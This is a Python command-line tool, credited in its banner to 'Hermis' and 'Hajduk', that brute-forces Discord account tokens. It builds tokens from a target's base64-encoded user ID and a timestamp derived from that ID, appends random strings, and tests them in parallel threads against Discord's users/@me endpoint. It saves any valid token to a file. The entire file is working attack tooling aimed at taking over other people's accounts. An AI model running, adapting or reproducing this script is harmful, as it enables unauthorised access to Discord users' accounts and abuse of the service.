import os
import base64
import random
import string
import requests
import threading
from colorama import Fore, init, Style

DISCORD_API_URL = 'https://discordapp.com/api/v9/users/@me'
MAX_THREADS = 10

init()

valid_token_found = threading.Event()
lock = threading.Lock()

def print_colored(text, color_code=0):
    print(f"\033[{color_code}m{text}\033[0m")

def clear_console():
    os.system("cls" if os.name == "nt" else "clear")

def encode_base64(input_str):
    return base64.urlsafe_b64encode(input_str.encode()).decode().rstrip("=")

def generate_random_string(k):
    characters = string.ascii_letters + string.digits + "-_"
    return ''.join(random.choice(characters) for _ in range(k))

def get_token(user_id, part2):
    part1 = user_id
    part3 = generate_random_string(38)
    token = f"{part1}.{part2}.{part3}"
    return token

def check_token_validity(token):
    """Check if a token is valid by making a request to the Discord API."""
    headers = {'Authorization': token}
    try:
        response = requests.get(DISCORD_API_URL, headers=headers, timeout=5)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def worker_generate_tokens(num_tokens, user_id, part2):
    """Worker thread for generating and testing tokens."""
    for _ in range(num_tokens):
        if valid_token_found.is_set():
            return
        
        token = get_token(user_id, part2)
        is_valid = check_token_validity(token)

        with lock:
            status = f"{Fore.GREEN}VALID{Fore.RESET}" if is_valid else f"{Fore.RED}INVALID{Fore.RESET}"
            print(f"Generated Token: {token} [{status}]")

        if is_valid:
            with lock:
                print(f"\n{Fore.GREEN}[!] Valid Token Found: {token}{Fore.RESET}\n")
                write_to_file("valid_token.txt", token)
                valid_token_found.set()
            return

def write_to_file(filename, content):
    """Write valid token to a file."""
    with open(filename, "w") as f:
        f.write(content + "\n")

def task_generate_tokens():
    clear_console()
    print(f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    Token Generator and Tester Selected{Fore.RESET}")

    try:
        total_tokens = int(input(f"{Fore.MAGENTA}[$]{Style.RESET_ALL} Total number of tokens to generate: {Fore.RESET}"))
        user_id = input(f"{Fore.MAGENTA}[$]{Style.RESET_ALL} Enter User ID (Base64): {Fore.RESET}")
        part2 = input(f"{Fore.MAGENTA}[$]{Style.RESET_ALL} Enter Timestamp (Base64): {Fore.RESET}")

        if not user_id or not part2:
            raise ValueError("User ID and Timestamp cannot be empty.")

        num_threads = int(input(f"{Fore.MAGENTA}[$]{Style.RESET_ALL} Number of threads to use (Max {MAX_THREADS}): {Fore.RESET}"))
        num_threads = min(MAX_THREADS, num_threads)

        tokens_per_thread = total_tokens // num_threads
        remainder = total_tokens % num_threads

        threads = []
        for i in range(num_threads):
            tokens_for_thread = tokens_per_thread + (1 if i < remainder else 0)
            thread = threading.Thread(target=worker_generate_tokens, args=(tokens_for_thread, user_id, part2))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        if not valid_token_found.is_set():
            print(f"{Fore.RED}[!] No valid token was found. Try again with different parameters.{Fore.RESET}")

    except ValueError as e:
        print(f"{Fore.RED}Error: {e}{Fore.RESET}")

def task_encode_user_id():
    clear_console()
    print(f"{Fore.CYAN}[+] Base64 Encode User ID Selected{Fore.RESET}")

    userid = input(" [INPUT] USER ID : ")
    encodedBytes = base64.b64encode(userid.encode("utf-8"))
    encodedStr = str(encodedBytes, "utf-8")
    print(f'\n [LOGS] TOKEN FIRST PART : {Fore.YELLOW}{encodedStr}{Fore.RESET}')
    input(f"{Fore.CYAN}Press Enter to return to the menu...{Fore.RESET}")

def task_extract_timestamp():
    clear_console()
    print(f"{Fore.CYAN}[+] Extract Timestamp from User ID Selected{Fore.RESET}")

    user_id = input(" [INPUT] USER ID : ")
    try:
        snowflake = int(user_id)
        timestamp = (snowflake >> 22) + 1420070400000

        timestamp_str = str(timestamp)
        encoded_bytes = base64.b64encode(timestamp_str.encode("utf-8"))
        encoded_str = str(encoded_bytes, "utf-8")

        final_result = encoded_str[:6] if len(encoded_str) > 6 else encoded_str
        print(f"\n [LOGS] Extracted and Encoded Timestamp: {Fore.YELLOW}{final_result}{Fore.RESET}")
    except ValueError:
        print(f"{Fore.RED}Error: Please enter a valid numeric User ID.{Fore.RESET}")

    input(f"{Fore.CYAN}Press Enter to return to the menu...{Fore.RESET}")

def print_banner():
    banner = (Fore.GREEN + """

    ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░       ░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░   Original Dev: Hermis
    ░▒▓████████▓▒░▒▓████████▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░     Enchanched by: Hajduk
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░   Pomaški Sibǎr Eksperimentij
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░   Помашки Сибър Eкспериментий
     """ + Fore.LIGHTCYAN_EX)
    print(banner)

def main():
    while True:
        clear_console()
        print_banner()
        print(f"{Fore.GREEN}[1]{Fore.RESET} Generate Tokens and Test Validity with Threading")
        print(f"{Fore.GREEN}[2]{Fore.RESET} Base64 Encode User ID")
        print(f"{Fore.GREEN}[3]{Fore.RESET} Extract Timestamp from User ID and Convert to Base64")
        print(f"{Fore.GREEN}[0]{Fore.RESET} Exit")

        choice = input(f"{Fore.MAGENTA}[$]{Style.RESET_ALL} Select an option: {Fore.RESET}")

        if choice == "1":
            task_generate_tokens()
        elif choice == "2":
            task_encode_user_id()
        elif choice == "3":
            task_extract_timestamp()
        elif choice == "0":
            print(f"{Fore.CYAN}Exiting... Goodbye!{Fore.RESET}")
            break
        else:
            print(f"{Fore.RED}Invalid choice. Please try again.{Fore.RESET}")
        input(f"{Fore.CYAN}Press Enter to return to the menu...{Fore.RESET}")

if __name__ == "__main__":
    main()


